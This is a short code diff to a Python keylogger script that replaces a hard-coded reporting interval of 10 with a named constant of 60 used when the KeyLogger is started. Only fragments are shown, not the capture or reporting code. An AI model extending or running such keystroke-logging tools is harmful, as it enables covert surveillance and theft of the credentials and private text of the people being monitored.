@@ -12,6 +12,7 @@ from datetime import datetime
 from dotenv import load_dotenv
 
 load_dotenv()
+REPORTING_INTERVAL = 60
 
 class KeyLogger():
     def __init__(self, interval, stop) -> None:
@@ -109,5 +110,5 @@ class KeyLogger():
             keyboard_listener.join()
 
 if __name__ == "__main__":
-    keylogger = KeyLogger(10, True)
+    keylogger = KeyLogger(REPORTING_INTERVAL, True)
     keylogger.run()
